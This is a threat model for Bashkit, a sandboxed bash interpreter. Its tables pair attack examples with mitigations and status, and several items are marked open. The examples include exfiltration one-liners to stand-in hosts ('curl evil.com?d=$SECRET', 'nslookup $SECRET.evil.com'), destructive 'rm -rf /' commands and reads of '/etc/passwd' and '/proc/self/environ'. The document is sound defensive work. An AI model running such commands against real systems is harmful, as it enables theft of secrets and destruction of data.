# Threat Model

Bashkit is designed to execute untrusted bash scripts safely in virtual environments.
This document describes the security threats we address and how they are mitigated.

**See also:**
- [API Documentation](https://docs.rs/bashkit) - Full API reference
- [Custom Builtins](./custom_builtins.md) - Extending Bashkit safely
- [Compatibility Reference](./compatibility.md) - Supported bash features
- [Logging Guide](./logging.md) - Structured logging with security (TM-LOG-*)

## Overview

Bashkit assumes all script input is potentially malicious. The virtual environment prevents:

- **Resource exhaustion** (CPU, memory, disk)
- **Sandbox escape** (filesystem, process, privilege)
- **Information disclosure** (secrets, host info)
- **Network abuse** (exfiltration, unauthorized access)

## Threat Categories

### Denial of Service (TM-DOS-*)

Scripts may attempt to exhaust system resources. Bashkit mitigates these attacks
through configurable limits.

**Memory Exhaustion:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Large input (TM-DOS-001) | 1GB script | `max_input_bytes` limit (10MB) | MITIGATED |
| Output flooding (TM-DOS-002) | `yes \| head -n 1000000000` | Command limit stops loop | MITIGATED |
| Variable explosion (TM-DOS-003) | `x=$(cat /dev/urandom)` | No /dev/urandom in VFS | MITIGATED |
| Array growth (TM-DOS-004) | `arr+=(element)` in loop | Command limit | MITIGATED |

**Filesystem Exhaustion:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Large file (TM-DOS-005) | `dd if=/dev/zero bs=1G count=100` | `max_file_size` limit | MITIGATED |
| Many files (TM-DOS-006) | Create 1M files | `max_file_count` | MITIGATED |
| Zip bomb (TM-DOS-007) | `gunzip bomb.gz` | Decompression limit | MITIGATED |
| Tar bomb (TM-DOS-008) | `tar -xf bomb.tar` | FS limits | MITIGATED |
| Recursive copy (TM-DOS-009) | `cp -r /tmp /tmp/copy` | FS limits | MITIGATED |
| Append flood (TM-DOS-010) | `while true; do echo x >> f; done` | FS + loop limits | MITIGATED |
| Symlink loops (TM-DOS-011) | `ln -s /a /b; ln -s /b /a` | No symlink following | MITIGATED |
| Deep dirs (TM-DOS-012) | `mkdir -p a/b/c/.../z` (1000 levels) | `max_path_depth` (100) | MITIGATED |
| Long filenames (TM-DOS-013) | 10KB filename | `max_filename_length` (255) + `max_path_length` (4096) | MITIGATED |
| Many dir entries (TM-DOS-014) | 1M files in one dir | `max_file_count` | MITIGATED |
| Unicode path attacks (TM-DOS-015) | RTL override in filename | `validate_path()` rejects control/bidi chars | MITIGATED |
| TOCTOU append (TM-DOS-034) | Concurrent appends bypass limits | Single write lock | **OPEN** |
| OverlayFs upper-only check (TM-DOS-035) | `check_write_limits()` ignores lower layer | Combined limit accounting | **OPEN** |
| OverlayFs double-count (TM-DOS-036) | `compute_usage()` counts overwritten files | Subtract overrides | **OPEN** |
| OverlayFs chmod CoW bypass (TM-DOS-037) | chmod writes to unlimited upper | Route through `check_write_limits()` | **OPEN** |
| OverlayFs incomplete whiteout (TM-DOS-038) | `rm -r` misses lower children | Check ancestor whiteouts | **OPEN** |
| Missing validate_path (TM-DOS-039) | VFS methods skip path checks | Add to all methods | **OPEN** |
| 32-bit truncation (TM-DOS-040) | `u64 as usize` on 32-bit | `usize::try_from()` | **OPEN** |
| OverlayFs symlink bypass (TM-DOS-045) | Unlimited symlink creation | Add `check_write_limits()` | **OPEN** |
| MountableFs no validation (TM-DOS-046) | Mounted FS skips `validate_path()` | Add to all methods | **OPEN** |
| Copy skip limit check (TM-DOS-047) | Copy overwrites without limit check | Always `check_write_limits()` | **OPEN** |
| Rename overwrites dirs (TM-DOS-048) | File over directory orphans children | Reject per POSIX | **OPEN** |

**Loops and CPU:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| While true (TM-DOS-016) | `while true; do :; done` | Loop limit (10K) | MITIGATED |
| For loop (TM-DOS-017) | `for i in $(seq 1 inf)` | Loop limit | MITIGATED |
| Nested loops (TM-DOS-018) | Double for loop | `max_total_loop_iterations` (1M) | MITIGATED |
| Command flood (TM-DOS-019) | 100K sequential commands | Command limit (10K) | MITIGATED |
| Long computation (TM-DOS-023) | Complex awk/sed regex | Timeout (30s) | MITIGATED |
| Regex backtrack (TM-DOS-025) | `grep "a](*b)*c" file` | Regex crate limits | PARTIAL |
| AWK unbounded loops (TM-DOS-033) | `BEGIN { while(1){} }` | Timeout (30s) backstop | PARTIAL |

**Stack Overflow / Recursion:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Function recursion (TM-DOS-020) | `f() { f; }; f` | Depth limit (100) | MITIGATED |
| Command sub depth (TM-DOS-021) | `$($($($())))` nesting | Inherited depth/fuel from parent | MITIGATED |
| Parser depth (TM-DOS-022) | `(((((...))))))` nesting | `max_ast_depth` + hard cap (100) | MITIGATED |
| Arithmetic depth (TM-DOS-026) | `$(((((...))))))` | `MAX_ARITHMETIC_DEPTH` (50) | MITIGATED |
| Builtin parser depth (TM-DOS-027) | Deeply nested awk/jq | `MAX_AWK_PARSER_DEPTH` (100) + `MAX_JQ_JSON_DEPTH` (100) | MITIGATED |
| Collect dirs recursion (TM-DOS-049) | Deep VFS tree | Mitigated by `max_path_depth` | MITIGATED |

**Parser and Arithmetic:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Parser hang (TM-DOS-024) | Malformed input | `parser_timeout` + `max_parser_operations` | MITIGATED |
| Diff DoS (TM-DOS-028) | `diff` on large unrelated files | LCS matrix cap (10M cells) | MITIGATED |
| Parser limit bypass (TM-DOS-030) | eval/source ignore limits | `Parser::with_limits()` | **FIXED** |
| Arithmetic overflow (TM-DOS-029) | `$(( 2 ** -1 ))` | Use wrapping arithmetic | **OPEN** |
| ExtGlob blowup (TM-DOS-031) | `+(a\|aa)` exponential | Add depth limit | **OPEN** |
| Tokio runtime exhaustion (TM-DOS-032) | Rapid `execute_sync()` calls | Shared runtime | **OPEN** |
| Brace range OOM (TM-DOS-041) | `{1..999999999}` | Cap range size | **OPEN** |
| Brace combinatorial (TM-DOS-042) | `{1..100}{1..100}{1..100}` | Cap total expansion | **OPEN** |
| Compound assign overflow (TM-DOS-043) | `((x+=1))` with x=i64::MAX | `wrapping_*` ops | **OPEN** |
| Lexer stack overflow (TM-DOS-044) | ~50 nested `$()` in quotes | Depth tracking | **OPEN** |
| parse_word_string limits (TM-DOS-050) | Parameter expansion ignores limits | Propagate limits | **OPEN** |
| YAML parser recursion (TM-DOS-051) | Deeply nested YAML stack overflow | Add depth limit | **OPEN** |
| Template engine recursion (TM-DOS-052) | Nested `{{#if}}`/`{{#each}}` overflow | Add depth limit | **OPEN** |
| Template output explosion (TM-DOS-053) | `{{#each}}` on large array | Bounded by `max_file_size` | MITIGATED |
| glob ExtGlob blowup (TM-DOS-054) | `glob --files "+(a\|aa)"` | Same as TM-DOS-031 | **OPEN** |
| split file count (TM-DOS-055) | `split -l 1 bigfile` | FS `max_file_count` limit | MITIGATED |

**Configuration:**
```rust
use bashkit::{Bash, ExecutionLimits, FsLimits, InMemoryFs};
use std::sync::Arc;
use std::time::Duration;

# fn main() {
let limits = ExecutionLimits::new()
    .max_commands(10_000)
    .max_loop_iterations(10_000)
    .max_function_depth(100)
    .timeout(Duration::from_secs(30))
    .max_input_bytes(10_000_000);  // 10MB

let fs_limits = FsLimits::new()
    .max_total_bytes(100_000_000)  // 100MB
    .max_file_size(10_000_000)     // 10MB per file
    .max_file_count(10_000);

let fs = Arc::new(InMemoryFs::with_limits(fs_limits));
let bash = Bash::builder()
    .limits(limits)
    .fs(fs)
    .build();
# }
```

### Sandbox Escape (TM-ESC-*)

Scripts may attempt to break out of the sandbox to access the host system.

**Filesystem Escape:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Path traversal (TM-ESC-001) | `cat /../../../etc/passwd` | Path normalization | MITIGATED |
| Symlink escape (TM-ESC-002) | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | MITIGATED |
| Real FS access (TM-ESC-003) | Direct syscalls | No real FS by default | MITIGATED |
| Mount escape (TM-ESC-004) | Mount real paths | MountableFs controlled by caller | MITIGATED |
| VFS limit bypass (TM-ESC-012) | `add_file()` skips limits | Restrict API visibility | **OPEN** |
| OverlayFs upper() exposed (TM-ESC-013) | `upper()` returns unlimited FS | Restrict visibility | **OPEN** |
| Custom builtins lost (TM-ESC-014) | `std::mem::take` empties builtins | Clone/Arc builtins | **OPEN** |

**Process Escape:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Shell escape (TM-ESC-005) | `exec /bin/bash` | Not implemented (exit 127) | MITIGATED |
| External commands (TM-ESC-006) | `./malicious` | Runs in VFS sandbox, no host shell | MITIGATED |
| Background proc (TM-ESC-007) | `malicious &` | Background not implemented | MITIGATED |
| eval injection (TM-ESC-008) | `eval "$input"` | Sandboxed eval (builtins only) | MITIGATED |
| bash/sh re-invoke (TM-ESC-015) | `bash -c "malicious"` | Sandboxed re-invocation | MITIGATED |

**Privilege Escalation:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| sudo/su (TM-ESC-009) | `sudo rm -rf /` | Not implemented | MITIGATED |
| setuid (TM-ESC-010) | Permission changes | Virtual FS, no real perms | MITIGATED |
| Capability abuse (TM-ESC-011) | Linux capabilities | Runs in-process | MITIGATED |

**Virtual Filesystem:**

Bashkit uses an in-memory virtual filesystem by default. Scripts cannot access the
real filesystem unless explicitly mounted via [`MountableFs`].

```rust
use bashkit::{Bash, InMemoryFs, MountableFs};
use std::sync::Arc;

# fn main() {
// Default: fully isolated in-memory filesystem
let bash = Bash::new();

// Custom filesystem with explicit mounts (advanced)
let root = Arc::new(InMemoryFs::new());
let fs = Arc::new(MountableFs::new(root));
// fs.mount("/data", Arc::new(InMemoryFs::new()));  // Mount additional filesystems
# }
```

### Information Disclosure (TM-INF-*)

Scripts may attempt to leak sensitive information.

**Secrets Access:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Env var leak (TM-INF-001) | `echo $SECRET` | Caller responsibility | CALLER RISK |
| File secrets (TM-INF-002) | `cat /secrets/key` | Virtual FS isolation | MITIGATED |
| Proc secrets (TM-INF-003) | `/proc/self/environ` | No /proc filesystem | MITIGATED |
| Memory dump (TM-INF-004) | Core dumps | No crash dumps | MITIGATED |

**Host Information:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Hostname (TM-INF-005) | `hostname` | Returns configurable virtual value | MITIGATED |
| Username (TM-INF-006) | `whoami`, `$USER` | Returns configurable virtual value | MITIGATED |
| IP address (TM-INF-007) | `ip addr`, `ifconfig` | Not implemented | MITIGATED |
| System info (TM-INF-008) | `uname -a` | Returns configurable virtual values | MITIGATED |
| User ID (TM-INF-009) | `id` | Returns hardcoded uid=1000 | MITIGATED |
| Date/time (TM-INF-018) | `date` | Returns real host time (fingerprinting risk) | **OPEN** |

**Network Exfiltration:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| HTTP exfil (TM-INF-010) | `curl evil.com?d=$SECRET` | Network allowlist | MITIGATED |
| DNS exfil (TM-INF-011) | `nslookup $SECRET.evil.com` | No DNS commands | MITIGATED |
| Timing channel (TM-INF-012) | Response time variations | Accepted (minimal risk) | ACCEPTED |

**Other Disclosure:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Host env via jq (TM-INF-013) | jq `env` exposes host env | Custom env via `$__bashkit_env__` | **FIXED** |
| Real PID leak (TM-INF-014) | `$$` returns real PID | Returns virtual PID (1) | **FIXED** |
| URL creds in errors (TM-INF-015) | Allowlist error echoes full URL | Apply URL redaction | **OPEN** |
| Error msg info leak (TM-INF-016) | Errors expose host paths/IPs | Sanitize error messages | **OPEN** |
| Internal markers leak (TM-INF-017) | `set` / `declare -p` show internals | Filter `is_internal_variable()` | **OPEN** |
| envsubst exposes env (TM-INF-019) | `envsubst` substitutes any `$VAR` | Caller controls env (same as TM-INF-001) | CALLER RISK |
| template exposes env (TM-INF-020) | `{{var}}` falls back to env | Caller controls env (same as TM-INF-001) | CALLER RISK |

**Caller Responsibility (TM-INF-001):**

Do NOT pass sensitive environment variables to untrusted scripts:

```rust
# use bashkit::Bash;
// UNSAFE - secrets may be leaked
let bash = Bash::builder()
    .env("DATABASE_URL", "postgres://user:pass@host/db")
    .env("API_KEY", "sk-secret-key")
    .build();

// SAFE - only pass non-sensitive variables
let bash = Bash::builder()
    .env("HOME", "/home/user")
    .env("TERM", "xterm")
    .build();
```

**System Information:**

System builtins return configurable virtual values, never real host information:

```rust
# use bashkit::Bash;
let bash = Bash::builder()
    .username("sandbox")         // whoami returns "sandbox"
    .hostname("bashkit-sandbox") // hostname returns "bashkit-sandbox"
    .build();
```

### Network Security (TM-NET-*)

Network access is disabled by default. When enabled, strict controls apply.

**DNS:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| DNS spoofing (TM-NET-001) | Resolve to wrong IP | No DNS resolution | MITIGATED |
| DNS rebinding (TM-NET-002) | Rebind after allowlist check | Literal host matching | MITIGATED |
| DNS exfiltration (TM-NET-003) | `dig secret.evil.com` | No DNS commands | MITIGATED |

**Network Bypass:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| IP instead of host (TM-NET-004) | `curl http://93.184.216.34` | Literal IP blocked unless allowed | MITIGATED |
| Port scanning (TM-NET-005) | `curl http://internal:$port` | Port must match allowlist | MITIGATED |
| Protocol downgrade (TM-NET-006) | HTTPS to HTTP | Scheme must match | MITIGATED |
| Subdomain bypass (TM-NET-007) | `evil.example.com` | Exact host match | MITIGATED |

**HTTP Attacks:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Large response (TM-NET-008) | 10GB download | Size limit (10MB) | MITIGATED |
| Connection hang (TM-NET-009) | Server never responds | Connect timeout (10s) | MITIGATED |
| Slowloris (TM-NET-010) | Slow response dripping | Read timeout (30s) | MITIGATED |
| Redirect bypass (TM-NET-011) | `Location: http://evil.com` | No auto-redirect | MITIGATED |
| Chunked bomb (TM-NET-012) | Infinite chunked response | Response size limit (streaming) | MITIGATED |
| Compression bomb (TM-NET-013) | 10KB to 10GB gzip | Auto-decompression disabled | MITIGATED |
| DNS rebind via redirect (TM-NET-014) | Redirect to rebinded IP | Redirect requires allowlist check | MITIGATED |

**Network Allowlist:**

```rust,ignore
use bashkit::{Bash, NetworkAllowlist};

// Explicit allowlist - only these URLs can be accessed
let allowlist = NetworkAllowlist::new()
    .allow("https://api.example.com")
    .allow("https://cdn.example.com/assets/");

let bash = Bash::builder()
    .network(allowlist)
    .build();

// Scripts can now use curl/wget, but only to allowed URLs
// curl https://api.example.com/data  → allowed
// curl https://evil.com              → blocked (exit 7)
```

**Domain Allowlist (TM-NET-015, TM-NET-016):**

For simpler domain-level control, `allow_domain()` permits all traffic to a domain
regardless of scheme, port, or path. This is the virtual equivalent of SNI-based
egress filtering — the same approach used by production sandbox environments.

```rust,ignore
use bashkit::{Bash, NetworkAllowlist};

// Domain-level: any scheme, port, or path to these hosts
let allowlist = NetworkAllowlist::new()
    .allow_domain("api.example.com")
    .allow_domain("cdn.example.com");

// Both of these are allowed:
// curl https://api.example.com/v1/data
// curl http://api.example.com:8080/health
```

Trade-off: domain rules intentionally skip scheme and port enforcement. Use URL
patterns (`allow()`) when you need tighter control. Both can be combined.

**No Wildcard Subdomains (TM-NET-017):**

Wildcard patterns like `*.example.com` are not supported. They would enable data
exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.com`).

### Injection Attacks (TM-INJ-*)

**Command Injection:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Variable injection (TM-INJ-001) | `$input` containing `; rm -rf /` | Variables expand to strings only | MITIGATED |
| Backtick injection (TM-INJ-002) | `` `$malicious` `` | Parsed as command sub | MITIGATED |
| eval bypass (TM-INJ-003) | `eval $user_input` | eval sandboxed (builtins only) | MITIGATED |

**Path Injection:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Null byte (TM-INJ-004) | `cat "file\x00/../etc/passwd"` | Rust strings have no nulls | MITIGATED |
| Path traversal (TM-INJ-005) | `../../../../etc/passwd` | Path normalization | MITIGATED |
| Encoding bypass (TM-INJ-006) | URL/unicode encoding | PathBuf handles | MITIGATED |
| Tar path traversal (TM-INJ-010) | `tar -xf` with `../` entries | Validate extract paths | **OPEN** |

**Output / Display:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| HTML in output (TM-INJ-007) | Script outputs `<script>` | N/A (CLI tool) | NOT APPLICABLE |
| Terminal escapes (TM-INJ-008) | ANSI sequences in output | Caller should sanitize | CALLER RISK |

**Internal State:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Internal var injection (TM-INJ-009) | Set `_READONLY_X=""` | Isolate internal namespace | **OPEN** |
| Cyclic nameref (TM-INJ-011) | Cyclic refs resolve silently | Detect cycle, error | **OPEN** |
| declare bypasses guard (TM-INJ-012) | `declare _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
| readonly bypasses guard (TM-INJ-013) | `readonly _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
| local bypasses guard (TM-INJ-014) | `local _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
| export bypasses guard (TM-INJ-015) | `export _NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |
| Missing array prefix (TM-INJ-016) | `_ARRAY_READ_` not in guard | Add prefix to `is_internal_variable()` | **OPEN** |
| Unzip path traversal (TM-INJ-017) | `unzip` with `../` entry names | Validate paths within extract base | **OPEN** |
| Dotenv internal injection (TM-INJ-018) | `.env` with `_NAMEREF_x=target` | Add `is_internal_variable()` check | **OPEN** |

**Variable Expansion:**

Variables expand to literal strings, not re-parsed as commands:

```bash
# If user_input contains "; rm -rf /"
user_input="; rm -rf /"
echo $user_input
# Output: "; rm -rf /" (literal string, NOT executed)
```

### Multi-Tenant Isolation (TM-ISO-*)

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Shared filesystem (TM-ISO-001) | Access other tenant files | Separate Bash instances | MITIGATED |
| Shared memory (TM-ISO-002) | Read other tenant data | Rust memory safety | MITIGATED |
| Resource starvation (TM-ISO-003) | One tenant exhausts limits | Per-instance limits | MITIGATED |
| Cross-tenant jq env (TM-ISO-004) | `std::env::set_var()` in jq | Same fix as TM-INF-013 | **OPEN** |

Each [`Bash`] instance is fully isolated. For multi-tenant environments, create
separate instances per tenant:

```rust
use bashkit::{Bash, InMemoryFs};
use std::sync::Arc;

# fn main() {
// Each tenant gets completely isolated instance
let tenant_a = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Separate filesystem
    .build();

let tenant_b = Bash::builder()
    .fs(Arc::new(InMemoryFs::new()))  // Different filesystem
    .build();

// tenant_a cannot access tenant_b's files or state
# }
```

### Internal Error Handling (TM-INT-*)

Bashkit is designed to never crash, even when processing malicious or malformed input.
All unexpected errors are caught and converted to safe, human-readable messages.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Builtin panic (TM-INT-001) | Trigger panic in builtin | `catch_unwind` wrapper | MITIGATED |
| Info leak in panic (TM-INT-002) | Panic exposes secrets | Sanitized error messages | MITIGATED |
| Date format crash (TM-INT-003) | Invalid strftime: `+%Q` | Pre-validation | MITIGATED |
| Path leak in errors (TM-INT-004) | Error shows real FS paths | Virtual paths only | MITIGATED |
| Memory addr in errors (TM-INT-005) | Debug output shows addresses | Display impl hides addresses | MITIGATED |
| Stack trace exposure (TM-INT-006) | Panic unwinds show call stack | `catch_unwind` prevents propagation | MITIGATED |

**Panic Recovery:**

All builtins (both built-in and custom) are wrapped with panic catching:

```text
If a builtin panics, the script continues with a sanitized error.
The panic message is NOT exposed (may contain sensitive data).
Output: "bash: <command>: builtin failed unexpectedly"
```

**Error Message Safety:**

Error messages never expose:
- Stack traces or call stacks
- Memory addresses
- Real filesystem paths (only virtual paths)
- Panic messages that may contain secrets

### Logging Security (TM-LOG-*)

When the `logging` feature is enabled, Bashkit emits structured logs. Security features
prevent sensitive data leakage:

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Secrets in logs (TM-LOG-001) | Log `$PASSWORD` value | Env var redaction | MITIGATED |
| Script leak (TM-LOG-002) | Log script with embedded secrets | Script content disabled by default | MITIGATED |
| URL credentials (TM-LOG-003) | Log `https://user:pass@host` | URL credential redaction | MITIGATED |
| API key leak (TM-LOG-004) | Log JWT or API key values | Entropy-based detection | MITIGATED |
| Log injection (TM-LOG-005) | Script with `\n[ERROR]` | Newline escaping | MITIGATED |
| Control char injection (TM-LOG-006) | ANSI escapes in logs | Control char filtering | MITIGATED |
| Log flooding (TM-LOG-007) | Excessive script output | Value truncation | MITIGATED |
| Large value DoS (TM-LOG-008) | Log very long strings | `max_value_length` limit (200) | MITIGATED |

**Logging Configuration:**

```rust,ignore
use bashkit::{Bash, LogConfig};

// Default: secure (redaction enabled, script content hidden)
let bash = Bash::builder()
    .log_config(LogConfig::new())
    .build();

// Add custom redaction patterns
let bash = Bash::builder()
    .log_config(LogConfig::new()
        .redact_env("MY_CUSTOM_SECRET"))
    .build();
```

**Warning:** Do not use `LogConfig::unsafe_disable_redaction()` or
`LogConfig::unsafe_log_scripts()` in production.

## Parser Depth Protection

The parser includes multiple layers of depth protection to prevent stack overflow
attacks:

1. **Configurable depth limit** (`max_ast_depth`, default 100): Controls maximum nesting
   of compound commands (if/for/while/case/subshell).

2. **Hard cap** (`HARD_MAX_AST_DEPTH = 100`): Even if the caller configures a higher
   `max_ast_depth`, the parser clamps it to 100. This prevents misconfiguration from
   causing stack overflow.

3. **Child parser inheritance** (TM-DOS-021): When parsing `$(...)` or `<(...)`,
   the child parser inherits the *remaining* depth budget and fuel from the parent.
   This prevents attackers from bypassing depth limits through nested substitutions.

4. **Arithmetic depth limit** (TM-DOS-026): The arithmetic evaluator (`$((expr))`)
   has its own depth limit (`MAX_ARITHMETIC_DEPTH = 50`) to prevent stack overflow
   from deeply nested parenthesized expressions.

5. **Parser fuel** (`max_parser_operations`, default 100K): Independent of depth,
   limits total parser work to prevent CPU exhaustion.

### Python / Monty Security (TM-PY-*)

The `python`/`python3` builtins embed the Monty Python interpreter with VFS bridging.
Python `pathlib.Path` operations are bridged to Bashkit's virtual filesystem.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Infinite loop (TM-PY-001) | `while True: pass` | Monty time limit (30s) + allocation cap | MITIGATED |
| Memory exhaustion (TM-PY-002) | Large allocation | Monty max_memory (64MB) + max_allocations (1M) | MITIGATED |
| Stack overflow (TM-PY-003) | Deep recursion | Monty max_recursion (200) | MITIGATED |
| Shell escape (TM-PY-004) | `os.system()` | Monty has no os.system/subprocess | MITIGATED |
| Real FS access (TM-PY-005) | `open()` | Monty has no open() builtin | MITIGATED |
| Error info leak (TM-PY-006) | Errors go to stdout | Errors go to stderr, not stdout | MITIGATED |
| Real FS read (TM-PY-015) | `Path.read_text()` | VFS bridge reads only from BashKit VFS | MITIGATED |
| Real FS write (TM-PY-016) | `Path.write_text()` | VFS bridge writes only to BashKit VFS | MITIGATED |
| Path traversal (TM-PY-017) | `../../etc/passwd` | VFS path normalization | MITIGATED |
| Bash/Python VFS isolation (TM-PY-018) | Cross-tenant access | Shared VFS by design; no cross-tenant | MITIGATED |
| Crash on missing file (TM-PY-019) | Missing file panic | FileNotFoundError raised, not panic | MITIGATED |
| Network access (TM-PY-020) | Socket/HTTP | Monty has no socket/network module | MITIGATED |
| VFS mkdir escape (TM-PY-021) | mkdir outside VFS | mkdir operates only in VFS | MITIGATED |
| VM crash (TM-PY-022) | Malformed input | Parser depth limit + resource limits | MITIGATED |
| Shell injection (TM-PY-023) | deepagents.py f-strings | Use shlex.quote() | **OPEN** |
| Heredoc escape (TM-PY-024) | Content contains delimiter | Random delimiter | **OPEN** |
| GIL deadlock (TM-PY-025) | execute_sync holds GIL | py.allow_threads() | **OPEN** |
| Config lost on reset (TM-PY-026) | reset() drops limits | Preserve config | **OPEN** |
| JSON recursion (TM-PY-027) | Nested dicts overflow stack | Add depth limit | **OPEN** |
| BashTool.reset() drops config (TM-PY-028) | reset() removes limits | Preserve config (match PyBash) | **OPEN** |

**Architecture:**

```text
Python code → Monty VM → OsCall pause → BashKit VFS bridge → resume
```

Monty runs directly in the host process. Resource limits (memory, allocations,
time, recursion) are enforced by Monty's own runtime. All VFS operations are
bridged through the host process — Python code never touches the real filesystem.

### Git Security (TM-GIT-*)

Optional virtual git operations via the `git` feature. All operations are confined
to the virtual filesystem.

**Repository Access:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Host identity leak (TM-GIT-002) | Commit reveals real name/email | Configurable virtual identity | MITIGATED |
| Host git config (TM-GIT-003) | Read ~/.gitconfig | No host filesystem access | MITIGATED |
| Credential theft (TM-GIT-004) | Access credential store | No host filesystem access | MITIGATED |
| Repository escape (TM-GIT-005) | Clone outside VFS | All paths in VFS | MITIGATED |

**Git DoS:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Large repo clone (TM-GIT-006) | Clone huge repository | FS size limits | PLANNED (Phase 2) |
| Many git objects (TM-GIT-007) | Millions of objects | `max_file_count` FS limit | MITIGATED |
| Deep history (TM-GIT-008) | Very long commit log | Log limit parameter | MITIGATED |
| Large pack files (TM-GIT-009) | Huge .git/objects/pack | `max_file_size` FS limit | MITIGATED |

**Remote Operations (Phase 2):**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Unauthorized clone (TM-GIT-001) | `git clone evil.com` | Remote URL allowlist | PLANNED |
| Push to unauthorized (TM-GIT-010) | `git push evil.com` | Remote URL allowlist | PLANNED |
| Fetch from unauthorized (TM-GIT-011) | `git fetch evil.com` | Remote URL allowlist | PLANNED |
| SSH key access (TM-GIT-012) | Use host SSH keys | HTTPS only (no SSH) | PLANNED |
| Git protocol bypass (TM-GIT-013) | Use `git://` protocol | HTTPS only | PLANNED |
| Branch name injection (TM-GIT-014) | `git branch ../../config` | Validate branch names | **OPEN** |

**Virtual Identity:**

```rust,ignore
use bashkit::Bash;

let bash = Bash::builder()
    .git_author("sandbox", "sandbox@example.com")
    .build();
// Commits use virtual identity, never host ~/.gitconfig
```

### Unicode Security (TM-UNI-*)

Unicode input from untrusted scripts creates attack surface across the parser, builtins,
and virtual filesystem. AI agents frequently generate multi-byte Unicode (box-drawing,
emoji, CJK) that exercises these code paths.

**Byte-Boundary Safety (TM-UNI-001/002/015/016/017):**

Multiple builtins mix byte offsets with character indices, causing panics on multi-byte
input. All are caught by `catch_unwind` (TM-INT-001) preventing process crash, but the
builtin silently fails.

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Awk byte-boundary panic (TM-UNI-001) | Multi-byte chars in awk input | `catch_unwind` catches panic | PARTIAL |
| Sed byte-boundary panic (TM-UNI-002) | Box-drawing chars in sed pattern | `catch_unwind` catches panic | PARTIAL |
| Expr substr panic (TM-UNI-015) | `expr substr "café" 4 1` | `catch_unwind` catches panic | PARTIAL |
| Printf precision panic (TM-UNI-016) | `printf "%.1s" "é"` | `catch_unwind` catches panic | PARTIAL |
| Cut/tr byte-level parsing (TM-UNI-017) | `tr 'é' 'e'` — multi-byte in char set | `catch_unwind` catches; silent data loss | PARTIAL |

**Additional Byte/Char Confusion:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Interpreter arithmetic (TM-UNI-018) | Multi-byte before `=` in arithmetic | Wrong operator detection; no panic | PARTIAL |
| Network allowlist (TM-UNI-019) | Multi-byte in allowlist URL path | Wrong path boundary check | PARTIAL |

**Zero-Width and Invisible Characters:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Zero-width in filenames (TM-UNI-003) | Invisible chars create confusable names | Path validation (planned) | UNMITIGATED |
| Zero-width in variables (TM-UNI-004) | `\u{200B}PATH=malicious` | Matches Bash behavior | ACCEPTED |
| Zero-width in scripts (TM-UNI-005) | `echo "pass\u{200B}word"` | Correct pass-through | ACCEPTED |
| Tag char hiding (TM-UNI-011) | U+E0001-U+E007F in filenames | Path validation (planned) | UNMITIGATED |
| Annotation hiding (TM-UNI-012) | U+FFF9-U+FFFB in filenames | Not detected | UNMITIGATED |
| Deprecated format chars (TM-UNI-013) | U+206A-U+206F in filenames | Not detected | UNMITIGATED |

**Homoglyphs, Normalization, and Bidi:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Homoglyph filenames (TM-UNI-006) | Cyrillic 'а' vs Latin 'a' | Accepted risk | ACCEPTED |
| Homoglyph variables (TM-UNI-007) | Cyrillic in variable names | Matches Bash behavior | ACCEPTED |
| Normalization bypass (TM-UNI-008) | NFC vs NFD create distinct files | Matches Linux FS behavior | ACCEPTED |
| Bidi in script source (TM-UNI-014) | RTL overrides hide malicious code | Scripts untrusted by design | ACCEPTED |

**Combining Characters:**

| Threat | Attack Example | Mitigation | Status |
|--------|---------------|------------|--------|
| Excessive combiners in filenames (TM-UNI-009) | 1000 diacritical marks on one char | `max_filename_length` (255 bytes) | MITIGATED |
| Excessive combiners in builtins (TM-UNI-010) | Combiners in awk/grep patterns | Timeout + depth limits | MITIGATED |

**Safe Components (confirmed by full codebase audit):**
- Lexer: `Chars` iterator with `ch.len_utf8()` tracking
- wc: Correct `.len()` vs `.chars().count()` usage
- grep/jq: Delegate to Unicode-aware regex/jaq crates
- sort/uniq: String comparison, no byte indexing
- logging: Uses `is_char_boundary()` correctly
- python: Shebang strip via `find('\n')` — ASCII delimiter, safe
- Python bindings (bashkit-python): PyO3 `String` extraction, no manual byte/char ops
